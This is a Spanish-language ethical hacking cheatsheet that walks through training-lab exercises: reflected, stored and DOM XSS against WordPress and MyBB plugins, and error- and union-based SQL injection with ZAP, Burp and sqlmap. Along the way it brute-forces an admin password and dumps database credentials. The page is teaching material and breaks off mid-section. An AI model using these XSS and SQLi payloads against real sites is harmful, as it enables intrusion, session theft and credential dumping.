
# Vulnerabilidades Web

#### Relacionado

{% content-ref url="/pages/WJF2uHrAgrRYJr39SzGH" %}
[Cross Site Scripting (XSS)](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-web/cross-site-scripting-xss.md)
{% endcontent-ref %}

{% content-ref url="/pages/lIoNr7ttmkn5RkFA9FXK" %}
[SQL Injection](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-web/sql-injection.md)
{% endcontent-ref %}

## <mark style="color:purple;">XSS (Cross Site Scripting)</mark>

### Reflected XSS en WordPress

WordPress es un CMS gratuito, de código abierto y completo para alojar blogs y portales web. Está basado en PHP y MySQL y es uno de los CMS más populares. El plugin WordPress Relevanssi (4.0.4) es vulnerable a un ataque Reflected XSS (`CVE-2018-9034`).

En este laboratorio, el atacante ya tiene acceso de administrador, por lo que no hay nada más que hacer. Sin embargo, parece que el acceso de administrador sí conduce a un ataque XSS. Por lo tanto, puede intentar encontrar este XSS como un ejercicio puramente académico.

#### Lab

El laboratorio nos genera la siguiente URL con un Wordpress vulnerable:

```
https://zlfx4x6tglmk6sbg1yddm2h0l.eu-central-5.attackdefensecloudlabs.com/
```

#### Enumeración

Lanzaremos un escaneo de wpscan para enumerar el objetivo:

```bash
wpscan --url https://zlfx4x6tglmk6sbg1yddm2h0l.eu-central-5.attackdefensecloudlabs.com/ \ 
  --enumerate vp,vt,tt,cb,dbe,u,m \
  --plugins-detection aggressive \
  --api-token sa9wEcMOko6mOYZwVeOpcbVJWTqa0QUl80N********
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
 
[+] URL: https://zlfx4x6tglmk6sbg1yddm2h0l.eu-central-5.attackdefensecloudlabs.com/ [172.104.229.221]
[+] Started: Fri Feb  6 03:07:51 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - server: Apache/2.4.7 (Ubuntu)
 |  - x-powered-by: PHP/5.5.9-1ubuntu4.25
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress version 4.8 identified (Insecure, released on 2017-06-08).
 | Found By: Rss Generator (Passive Detection)
 |  - https://zlfx4x6tglmk6sbg1yddm2h0l.eu-central-5.attackdefensecloudlabs.com/feed/, <generator>https://wordpress.org/?v=4.8</generator>
 |  - https://zlfx4x6tglmk6sbg1yddm2h0l.eu-central-5.attackdefensecloudlabs.com/comments/feed/, <generator>https://wordpress.org/?v=4.8</generator>
 
 [+] WordPress theme in use: twentyseventeen
 | Location: https://zlfx4x6tglmk6sbg1yddm2h0l.eu-central-5.attackdefensecloudlabs.com/wp-content/themes/twentyseventeen/
 | Last Updated: 2025-12-03T00:00:00.000Z
 | Readme: https://zlfx4x6tglmk6sbg1yddm2h0l.eu-central-5.attackdefensecloudlabs.com/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 4.0
 | Style URL: https://zlfx4x6tglmk6sbg1yddm2h0l.eu-central-5.attackdefensecloudlabs.com/wp-content/themes/twentyseventeen/style.css?ver=4.8
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://zlfx4x6tglmk6sbg1yddm2h0l.eu-central-5.attackdefensecloudlabs.com/wp-content/themes/twentyseventeen/style.css?ver=4.8, Match: 'Version: 1.3'
```

Encontramos el plugin de `relevanssi` con múltiples vulnerabilidades asociadas:

```bash
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] relevanssi
 | Location: https://zlfx4x6tglmk6sbg1yddm2h0l.eu-central-5.attackdefensecloudlabs.com/wp-content/plugins/relevanssi/
 | Last Updated: 2025-12-16T06:32:00.000Z
 | Readme: https://zlfx4x6tglmk6sbg1yddm2h0l.eu-central-5.attackdefensecloudlabs.com/wp-content/plugins/relevanssi/readme.txt
 | [!] The version is out of date, the latest version is 4.26.0
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://zlfx4x6tglmk6sbg1yddm2h0l.eu-central-5.attackdefensecloudlabs.com/wp-content/plugins/relevanssi/, status: 200
 |
 | [!] 11 vulnerabilities identified:
 |
 | [!] Title: Relevanssi - A Better Search < 4.14.3 - Unauthenticated Stored Cross-Site Scripting
 |     Fixed in: 4.14.3
 |     References:
 |      - https://wpscan.com/vulnerability/ad08bd11-e4b0-4bb1-9481-3c9651f50466
 |      - https://plugins.trac.wordpress.org/changeset/2616189/relevanssi
 |
 | [!] Title: Relevanssi - Subscriber+ Unauthorised AJAX Calls
 |     Fixed in: 4.14.6
 |     References:
 |      - https://wpscan.com/vulnerability/c0c27674-715e-464d-ab38-0774128e6741
 |      - https://plugins.trac.wordpress.org/changeset/2648642
 |      - https://plugins.trac.wordpress.org/changeset/2648980
 |
 | [!] Title: Relevanssi (Free < 4.22.0, Premium < 2.25.0) - Unauthenticated Private/Draft Post Disclosure
 |     Fixed in: 4.22.0
 |     References:
 |      - https://wpscan.com/vulnerability/0c96a128-4473-41f5-82ce-94bba33ca4a3
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-7199
 |      - https://www.relevanssi.com/release-notes/premium-2-25-free-4-22-release-notes/
 |
 | [!] Title: Relevanssi < 4.22.1 - Unauthenticated Query Log Export
 |     Fixed in: 4.22.1
 |     References:
 |      - https://wpscan.com/vulnerability/79c73a0a-087f-4971-a95f-c21d1d4db26e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-1380
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/7b2a3b17-0551-4e02-8e6a-ae8d46da0ef8
 |
 | [!] Title: Relevanssi – A Better Search < 4.22.2 - Missing Authorization to Unauthenticated Count Option Update
 |     Fixed in: 4.22.2
 |     References:
 |      - https://wpscan.com/vulnerability/7b3ce9a6-17e1-42e1-b220-11c69300a9ca
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-3213
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/e625130f-8e21-4baf-9d3c-4cbb806b9e52
 |
 | [!] Title: Relevanssi < 4.23.0 - Unauthenticated Information Exposure
 |     Fixed in: 4.23.0
 |     References:
 |      - https://wpscan.com/vulnerability/0da3d56a-b3a8-43ac-873e-40cbda74165d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-7630
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/3fa78f4e-ede2-4863-a2d7-99bd8c7b5912
 |
 | [!] Title: Relevanssi < 4.23.1 - Contributor+ Stored XSS
 |     Fixed in: 4.23.1
 |     References:
 |      - https://wpscan.com/vulnerability/5f25646d-b80b-40b1-bcaf-3b860ddc4059
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-9021
 |      - https://research.cleantalk.org/CVE-2024-XXXX/
 |      - https://www.youtube.com/watch?v=https://drive.google.com/file/d/1qhjBeZVX3rCGxXm18cA6XT42wEwKLhcj/view?usp=sharing
 |
 | [!] Title: Relevanssi <= 4.24.3 (Free) and <= 2.27.4 (Premium) - Unauthenticated Stored Cross-Site Scripting via Search Highlights
 |     Fixed in: 4.24.4
 |     References:
 |      - https://wpscan.com/vulnerability/2295e503-5045-49a8-a279-43b04df36685
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-4054
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/6f77f10b-f142-4859-a941-0fbde6ef7fdb
 |
 | [!] Title: Relevanssi < 4.24.5 (Free) and < 2.27.5 (Premium) - Unauthenticated SQL Injection
 |     Fixed in: 4.24.5
 |     References:
 |      - https://wpscan.com/vulnerability/7b8ffd97-d9a4-43e1-9fc1-395230103f06
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-4396
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/197be163-4504-4caa-b729-c3293463cfb5
 |
 | [!] Title: Relevanssi <= 4.24.5 (Free) and <= 2.27.6 (Premium) - Unauthenticated Stored Cross-Site Scripting via Excerpt Highlights
 |     Fixed in: 4.24.6
 |     References:
 |      - https://wpscan.com/vulnerability/2682b3b9-3b06-4907-bfe0-4f31fdcab196
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-5016
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/ffb2ade3-d5ce-4459-ab83-e28cd4c84922
 |
 | [!] Title: Relevanssi (Free < 4.26.0, Premium < 2.29.0) - Contributor+ SQLi
 |     Fixed in: 4.26.0
 |     References:
 |      - https://wpscan.com/vulnerability/bd8e27c7-8f97-4313-b16e-50ac6f0676f5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-14719
 |
 | Version: 4.0.5 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://zlfx4x6tglmk6sbg1yddm2h0l.eu-central-5.attackdefensecloudlabs.com/wp-content/plugins/relevanssi/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - https://zlfx4x6tglmk6sbg1yddm2h0l.eu-central-5.attackdefensecloudlabs.com/wp-content/plugins/relevanssi/readme.txt
```

Y encontramos el usuario admin:

```bash
[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - https://zlfx4x6tglmk6sbg1yddm2h0l.eu-central-5.attackdefensecloudlabs.com/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
```

#### Búsqueda de exploits

```bash
searchsploit Relevanssi                                                                  
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                       |  Path
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Relevanssi - 'category_name' SQL Injection                                                                          | php/webapps/39109.txt
WordPress Plugin Relevanssi 2.7.2 - Persistent Cross-Site Scripting                                                                  | php/webapps/16233.txt
WordPress Plugin Relevanssi 4.0.4 - Reflected Cross-Site Scripting                                                                   | php/webapps/44366.txt
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Nos centraremos en esta sección en la vulnerabilidad Reflected Cross-Site Scripting.

Nos lo descargamos:

```bash
searchsploit -m 44366
       
  Exploit: WordPress Plugin Relevanssi 4.0.4 - Reflected Cross-Site Scripting
      URL: https://www.exploit-db.com/exploits/44366
     Path: /usr/share/exploitdb/exploits/php/webapps/44366.txt
    Codes: CVE-2018-9034
 Verified: False
File Type: HTML document, ASCII text, with very long lines (459)
Copied to: /home/kali/Escritorio/machines/ecppt/44366.txt
```

Y al leerlo vemos el payload que podemos usar en la URL:

```
/wp-admin/options-general.php?page=relevanssi%2Frelevanssi.php&tab='><SCRIPT>var+x+%3D+String(%2FXSS%2F)%3Bx+%3D+x.substring(1%2C+x.length-1)%3Balert(x)<%2FSCRIPT><BR+
```

#### Explotación

Necesitamos estar logueados para que funcione, por lo que haremos fuerza brutal al usuario admin para encontrar la contraseña, usaremos cmseek por ejemplo:

```
python3 cmseek.py
```

```bash
 ___ _  _ ____ ____ ____ _  _
|    |\/| [__  |___ |___ |_/  by @r3dhax0r
|___ |  | ___| |___ |___ | \_ Version 1.1.3 K-RONA


 [+]  WordPress XML-RPC Bruteforce Module  [+] 

Enter target site (https://example.tld): https://zlfx4x6tglmk6sbg1yddm2h0l.eu-central-5.attackdefensecloudlabs.com/
[i] Checking for WordPress
[*] WordPress Confirmed... validating xmlrpc interface
[*] Login form found.. Detecting Username For Bruteforce
[i] Starting Username Harvest
[i] Harvesting usernames from wp-json api
[*] Found user from wp-json : admin
[i] Harvesting usernames from jetpack public api
[!] No results from jetpack api... maybe the site doesn't use jetpack
[i] Harvesting usernames from wordpress author Parameter
[*] Found user from source code: admin
[*] 1 Usernames was enumerated

[i] Bruteforcing User: admin
[*] Password found!d: password1
 |
 |--[username]--> admin
 |
 |--[password]--> password1
 |
[*] Enjoy The Hunt!
```

Encontramos la contraseña en plano para el usuario `admin:password1`

Nos logueamos y llegamos al dashboard:

<figure><img src="/files/gXmJgEYwb52QUdKxWiud" alt=""><figcaption></figcaption></figure>

#### XSS

Una vez logueados usamos el payload anterior para hacer saltar el XSS, confirmando la vulnerabilidad:

```
https://zlfx4x6tglmk6sbg1yddm2h0l.eu-central-5.attackdefensecloudlabs.com/wp-admin/options-general.php?page=relevanssi%2Frelevanssi.php&tab=%27%3E%3CSCRIPT%3Evar+x+%3D+String%28%2FXSS%2F%29%3Bx+%3D+x.substring%281%2C+x.length-1%29%3Balert%28x%29%3C%2FSCRIPT%3E%3CBR+
```

<figure><img src="/files/AWYx8eCZv6DHQ7XlsqFT" alt=""><figcaption></figcaption></figure>

### Stored XSS en MyBB

En este lab, el atacante tiene acceso a una cuenta sin privilegios. Y este acceso conduce a un ataque XSS. En tales casos, esto se puede utilizar para atacar al administrador u otros usuarios. Incluso si no es así, podemos intentar encontrar este XSS como un ejercicio puramente académico

Una versión del **plugin MyBB Downloads** es vulnerable a un ataque XSS Stored.

Los siguientes nombres de usuario y contraseñas se pueden utilizar para explorar la aplicación y/o encontrar una vulnerabilidad que pueda requerir acceso autenticado:

```
 test2 | password
```

> Objetivo: Nuestra tarea es encontrar y explotar esta vulnerabilidad.

#### Lab

El lab nos da la siguiente URL vulnerable:

```
https://i43knc1x7drmn0y2luolae64h.eu-central-7.attackdefensecloudlabs.com/
```

<figure><img src="/files/dt0fl2uyoPmZF3LC3aoz" alt=""><figcaption></figcaption></figure>

Nos logueamos con las credenciales proporcionadas: `test2:password`

#### Enumeración

Usaremos MyBBscan para enumerar el objetivo:

{% embed url="<https://github.com/0xB9/MyBBscan>" %}

Nos clonamos el repositorio, instalamos las dependencias y lo ejecutamos:

```bash
pip install huepy
```

```bash
python3 scan.py

MyBBscan - v3.2.0
Made By: 0xB9
Twitter: 0xB9sec

[+] MyBBscan is up to date
------------------------------------------------------------

Examples:
https://MyBBforum.com/ 
https://MyBBforum.com/forum/ 
https://subdomain.MyBBforum.com/ 
https://127.0.0.1/
------------------------------------------------------------
Enter MyBB forum URL-> https://i43knc1x7drmn0y2luolae64h.eu-central-7.attackdefensecloudlabs.com/index.php
[~] Scanning-> https://i43knc1x7drmn0y2luolae64h.eu-central-7.attackdefensecloudlabs.com/index.php
------------------------------------------------------------
<---SNIP--->
--------------------------------------------------------------------------------------------------------------------------------------------
[-] Vulnerable Plugin!
Vulnerable Plugin: Thread Redirect
Version: 0.2.1
Vulnerability Type: Cross-Site Scripting
Information: https://packetstormsecurity.com/files/161214/MyBB-Thread-Redirect-0.2.1-Cross-Site-Scripting.html
--------------------------------------------------------------------------------------------------------------------------------------------
[-] Vulnerable Plugin!
Vulnerable Plugin: Trending Widget
Version: 1.2
Vulnerability Type: Cross-Site Scripting
Information: https://packetstormsecurity.com/files/161215/MyBB-Trending-Widget-1.2-Cross-Site-Scripting.html
--------------------------------------------------------------------------------------------------------------------------------------------
[-] Vulnerable Plugin!
Vulnerable Plugin: External Redirect Warning
Version: 1.3
Vulnerability Type: Cross-Site Scripting
Information: https://packetstormsecurity.com/files/171403/MyBB-External-Redirect-Warning-1.3-Cross-Site-Scripting.html
--------------------------------------------------------------------------------------------------------------------------------------------
[-] Vulnerable Plugin!
Vulnerable Plugin: Export User
Version: 2.0
Vulnerability Type: Cross-Site Scripting
Information: https://packetstormsecurity.com/files/171421/MyBB-Export-User-2.0-Cross-Site-Scripting.html
--------------------------------------------------------------------------------------------------------------------------------------------
<----SNIP---->

[+] Scan complete!
```

Observamos múltiples vulnerabilidades XSS, y usaremos el siguiente exploit:

{% embed url="<https://packetstormsecurity.com/files/147061/MyBB-Downloads-2.0.3-Cross-Site-Scripting.html>" %}

Y tiene un PoC asociado:

```
2. Proof of Concept:
 
Persistent XSS
- Go to downloads.php page
- Create a New Download
- Add the following to the title <BODY ONLOAD=alert('XSS')>
- Now when the admin goes to validate your download he will be alerted
```

Entonces lo seguiremos al pie de la letra. Vamos a `/downloads.php` y le damos a "`New Download`":

<figure><img src="/files/Dgc3DgycsQmHQ1CQofGp" alt=""><figcaption></figcaption></figure>

En el título ponemos: `<BODY ONLOAD=alert('XSS')>`

Y al guardar salta el XSS Stored:

<figure><img src="/files/oTXWvhpkfNrWhFsTp1Dp" alt=""><figcaption></figcaption></figure>

#### Extracción de cookies

Podemos usar el siguiente payload para extraer cookies y potencialmente hacer un Session Hijacking de un administrador:

```
<BODY ONLOAD=alert(document.cookie)>
```

<figure><img src="/files/D6uDxQbgWs4lDwbfXtDI" alt=""><figcaption></figcaption></figure>

### DOM Based XSS

En este laboratorio obtendrás experiencia práctica sobre cómo identificar y explotar una vulnerabilidad XSS basada en DOM.

La aplicación web objetivo es accesible en **demo.ine.local** , que es vulnerable a una vulnerabilidad XSS basada en DOM

**Objetivo:**  Describir cómo funciona el DOM (Modelo de objetos de documento) en relación con JavaScript y cómo se pueden identificar y explotar las vulnerabilidades XSS basadas en DOM.

<figure><img src="/files/Uv1YyKjfEJkf2hkhfKoq" alt=""><figcaption></figcaption></figure>

Al acceder a `demo.ine.local` vemos que la URL cambia a:

```
http://demo.ine.local/lab/webapp/jfp/dom?statement=10+10
```

Lo cual hace la suma y pinta el resultado en el front. Eso nos indica que el Javascript es dinámico y podemos explotarlo.

#### Extracción de cookies

Podemos usar el siguiente payload para extraer la cookie y pintarlo en el DOM:

```
http://demo.ine.local/lab/webapp/jfp/dom?statement=(document.cookie)
```

<figure><img src="/files/kQ51Aj9glKWrBOoGitNb" alt=""><figcaption></figcaption></figure>

Al ver el código fuente de la página observamos el Javascript que hace que se pinte en el DOM:

```html
<script>
    var statement = document.URL.split("statement=")[1];
    document.getElementById("result").innerHTML = eval(statement);
</script>
```

Podríamos usar también un payload como el siguiente para hacer saltar un XSS con la cookie:

```
http://demo.ine.local/lab/webapp/jfp/dom?statement=alert(document.cookie)
```

<figure><img src="/files/g6EhfNzyNY73u85QhAsm" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;">SQL Injection</mark>

En este laboratorio usaremos la web de Mutillidae para ver cómo funcionan distintas inyecciones SQL.

### Automatizar SQLi con OWASP ZAP

Abrimos OWASP ZAP y usamos su navegador integrado para ir a la página objetivo (demo.ine.local):

<figure><img src="/files/OlVYup8RprBFo74LVHwI" alt=""><figcaption></figcaption></figure>

#### Búsqueda de inputs

Iremos a la sección `OWASP 2017 > A1 Injection (SQL) > SQLi` y aquí introducimos un nombre y contraseña random, y en History vemos la solicitud:

<figure><img src="/files/Rta0ueFFMTLSNJtnfZ9K" alt=""><figcaption></figcaption></figure>

Para encontrar parámetros vulnerables a SQLi pulsaremos click derecho sobre la solicitud > Attack > Fuzzer:

<figure><img src="/files/k9reC7953hEfVWy8tHJ7" alt=""><figcaption></figcaption></figure>

Dentro del fuzzer por ejemplo probaremos en el campo username, eliminamos el texto "test", le damos a Save y pulsamos en Add para añadir payloads para fuzzing:

<figure><img src="/files/xqoTWLzIDaphanIDr2gh" alt=""><figcaption></figcaption></figure>

En el apartado `File Fuzzers` usaremos el diccionario `jbrofuzz`, concretamente el apartado de SQL Injections:

<figure><img src="/files/ffyXx3VAwVXJqO2rU3n2" alt=""><figcaption></figcaption></figure>

De damos a `Start Fuzzer` y en la columna de State veremos los payloads que funcionan para SQLi:

<figure><img src="/files/ctZt2WH4mrmOBmhSfgh9" alt=""><figcaption></figcaption></figure>

#### Analizando el SQLi

Encontramos un payload `a' or 1=1; --` que observamos que está reflected en la respuesta y tiene 23 registros asociados:

<figure><img src="/files/AnPzroBRYar03eZb6A7A" alt=""><figcaption></figcaption></figure>

Al introducir el payload vemos que da un error de SQL, confirmando la vulnerabilidad:

<figure><img src="/files/M1cAL1FA4DitAiypP38g" alt=""><figcaption></figcaption></figure>

Al probar otro payload cómo `' or username is not NULL or username = '` sin contraseña observamos que nos devuelve todas las contraseñas en plano:

<figure><img src="/files/ZrIsAom018XRUu25xaqU" alt=""><figcaption></figcaption></figure>

### Error Based SQL Injections

El **Error-Based SQL Injection** es una **técnica de inyección SQL** que consiste en **provocar errores deliberados en la base de datos** para que el servidor **revele información sensible en los mensajes de error**.

Dicho fácil: **el atacante “rompe” la consulta SQL a propósito para que la BD hable**.

<figure><img src="/files/00FRVRuNV8iOM7sm32NT" alt=""><figcaption></figcaption></figure>

#### Metodología de Error-Based SQL Injection

1. **Identificar un parámetro vulnerable**\
   Encontrar un parámetro dentro de la aplicación web que sea vulnerable a inyección SQL. Normalmente estos parámetros se localizan en inputs, parámetros en la URL o formularios.
2. **Inyectar código SQL malicioso**\
   Crear un payload que incluya sentencias SQL diseñadas para provocar un error en la base de datos. Esto puede implicar añadir sintaxis SQL inválida o manipular consultas existentes para forzar un fallo.
3. **Observar los mensajes de error**\
   Enviar la carga al parámetro vulnerable y analizar el mensaje de error devuelto por la base de datos. Dichos mensajes pueden proporcionar información valiosa sobre la estructura y el contenido de la base de datos.

### Lab: Error Based SQLi

Es posible que el atacante no tenga acceso de usuario a la aplicación web. Sin embargo, esto no significa que la aplicación no pueda ser comprometida remotamente. Las vulnerabilidades de inyección SQL podrían ser activadas incluso por usuarios no autenticados.

En el siguiente ejercicio, el atacante no está autenticado en la aplicación web y necesita encontrar un ataque de inyección SQL en ella.

Una versión de `PHPMyRecipes` es vulnerable a un ataque de inyección SQL.

En este entorno de laboratorio, se le proporcionará acceso a la interfaz gráfica de usuario de una máquina Kali. La máquina objetivo, accesible en `demo.ine.local`, aloja una versión de PHPMyRecipes vulnerable a un ataque de inyección SQL.

> Objetivo: Su tarea es encontrar y explotar esta vulnerabilidad.

<figure><img src="/files/34xqFOOJwQJnkCiR0Zzc" alt=""><figcaption></figcaption></figure>

#### Generar error

Probamos con una comilla simple en el input y obtenemos un mensaje de error SQL, lo cual nos indica la presencia de un SQLi potencial:

<figure><img src="/files/uBMcPYFm6tx4PE1xQcKN" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/jGRfNpUH9aJy3tRyNnPV" alt=""><figcaption></figcaption></figure>

Usaremos Burp Intruder para fuzzear distintos inputs, como por ejemplo el de la página de login a ver si podemos acceder:

<figure><img src="/files/tJ5nbYghv2IuLH5c0UBQ" alt=""><figcaption></figcaption></figure>

En la pestaña payloads pulsamos en Load para cargar una wordlist como la siguiente:

{% embed url="<https://github.com/PenTestical/sqli/blob/main/hugeSQL.txt>" %}

Y abajo del todo desactivamos la casilla de payload encoding. Pulsamos en Start Attack y observamos los resultados:

<figure><img src="/files/9MlNgnm4WonYlENrcFTw" alt=""><figcaption></figcaption></figure>

Ordenando por la columna Length observamos que con algunos payloads da el error en la respuesta.

#### Automatizar SQLi con SQL Map

Usaremos SQL Map para automatizar el proceso de SQL Injection. Para ello capturaremos una solicitud con Burp Suite poniendo un asterisco (`*`) en el parámetro a testear, y le daremos botón derecho > Copy to file, y lo guardaremos como `burp.req`.

<figure><img src="/files/LRKlRBXWvKeq1pXGGguQ" alt=""><figcaption></figcaption></figure>

```bash
┌──(root㉿INE)-[~/Desktop]
└─# sqlmap -r burp.req --batch --dbs
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.5.3.22#dev}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:50:11 /2026-02-08/

[20:50:11] [INFO] parsing HTTP request from 'burp.req'
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
[20:50:11] [INFO] testing connection to the target URL
[20:50:11] [INFO] checking if the target is protected by some kind of WAF/IPS
[20:50:12] [INFO] testing if the target URL content is stable
[20:50:12] [INFO] target URL content is stable
[20:50:12] [INFO] testing if (custom) POST parameter '#1*' is dynamic
<----SNIP---->
[20:50:42] [INFO] (custom) POST parameter '#1*' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
(custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 799 HTTP(s) requests:
---
Parameter: #1* ((custom) POST)
    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: words_preformat=' IN BOOLEAN MODE) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x717a626271,(SELECT (ELT(7868=7868,1))),0x7178626b71,0x78))s), 8446744073709551610, 8446744073709551610)))#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: words_preformat=' IN BOOLEAN MODE) AND (SELECT 4251 FROM (SELECT(SLEEP(5)))luko)#

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: words_preformat=' IN BOOLEAN MODE) UNION ALL SELECT NULL,CONCAT(0x717a626271,0x6462564f74695963517774624f6b524a447343616c4f6349697673657375584e51417978614d4976,0x7178626b71)#
---
[20:50:42] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL >= 5.5
[20:50:42] [INFO] fetching database names
[20:50:42] [INFO] retrieved: 'information_schema'
[20:50:42] [INFO] retrieved: 'recipes'
available databases [2]:                                                                                                                                                                                       
[*] information_schema
[*] recipes
```

Observamos que ha funcionado y nos da las 2 bases de datos disponibles.

#### Dumpeo de base de datos completa

```bash
┌──(root㉿INE)-[~/Desktop]
└─# sqlmap -r burp.req --ignore-redirects --batch --dump
```

```sql
[20:54:58] [INFO] fetching entries for table 'users' in database 'recipes'                                                                                                                                     
Database: recipes
Table: users
[1 entry]
+----+--------------------+-------+-------+----------+---------------+
| id | name               | privs | email | username | password      |
+----+--------------------+-------+-------+----------+---------------+
| 1  | phpMyRecipes Admin | 4096  | NULL  | recipes  | 6i1wgDRASJDhE |
+----+--------------------+-------+-------+----------+---------------+
```

Obtenemos la contraseña en plano para el usuario Admin!

#### Payload all the things

Podemos usar los payloads de SQLi de Payload All the Things, súper utilizados descubrir vulnerabilidades, en este caso SQL Injections:

{% embed url="<https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md>" %}

### Union Based SQL Injections (Lab)

Una **Union-Based SQL Injection** es un tipo de inyección SQL que aprovecha la cláusula `UNION` de SQL para **extraer datos adicionales de la base de datos** a través de una consulta vulnerable.

#### ¿Cómo funciona?

En SQL, `UNION` permite combinar los resultados de dos consultas `SELECT` siempre que tengan:

* El mismo número de columnas
* Tipos de datos compatibles

Ejemplo normal:

```sql
SELECT nombre, email FROM usuarios
UNION
SELECT producto, precio FROM productos;
```

Un atacante usa esto para **agregar su propia consulta maliciosa** a la consulta original.

En este entorno de laboratorio, se le proporcionará acceso a una máquina Kali mediante la GUI. La aplicación web de destino estará disponible en **`results.abc.univ.edu:5000`**

> **Objetivo:** Aprovechar la vulnerabilidad para determinar la versión de SQLite y dumpear la flag de la base de datos

<figure><img src="/files/Rodmb4gMultGvuw5SjPv" alt=""><figcaption></figcaption></figure>

#### Explotación

Al introducir cualquier número vemos las columnas de la base de datos:

<figure><img src="/files/sss16plpUYVW2HlCkPH3" alt=""><figcaption></figcaption></figure>

Capturamos la petición con Burp Suite y vemos que se pasa como parámetro rollno por GET:

```
GET /results?rollno=100
```

<figure><img src="/files/7BAIpU1iYhGP2uPqMfQG" alt=""><figcaption></figcaption></figure>

Al probar un payload cómo `' or 1=1--` vemos que nos devuelve el listado completo de las notas de los alumnos y Roll Numbers:

<figure><img src="/files/GEo0AnihQYWQq5C1sQPU" alt=""><figcaption></figcaption></figure>

Y con un payload cómo `' or 1=1 order by Name ASC --` podríamos ordenarlos alfabéticamente:

<figure><img src="/files/DGQmfV2PLG9ZzF90U8nj" alt=""><figcaption></figcaption></figure>

Para descubrir el número total de columnas de la base de datos usaremos el siguiente payload empezando por 1, e incrementando el valor hasta que nos muestre resultados o de algún error:

```
' or 1=1 union select 1,2,3,4,5 --
```

<figure><img src="/files/V0ue76M1iz9g7vURryBd" alt=""><figcaption></figcaption></figure>

En los resultados podemos observar que no se pinta la columna 2, pero si la 1,3,4 y 5.

#### Versión de SQLite

Podemos obtener la versión de SQLite con el siguiente payload, inyectándo `sqlite_version()` por ejemplo en la columna 1:

```
' or 1=1 union select sqlite_version(),2,3,4,5 --
```

<figure><img src="/files/roggPACpMGrKcQRWLcRP" alt=""><figcaption></figcaption></figure>

#### Ver nombres de las tablas

Usaremos el siguiente payload:

```
' or 1=1 union select tbl_name,2,3,4,5 from sqlite_master --
```

<figure><img src="/files/cpqj5lzvxiU16GEdJ6ll" alt=""><figcaption></figcaption></figure>

Obtenemos dos tablas interesantes, y sobre todo nos interesa la tabla que contiene la flag.

#### Ver estructura de las tablas

Usaremos el siguiente payload:

```
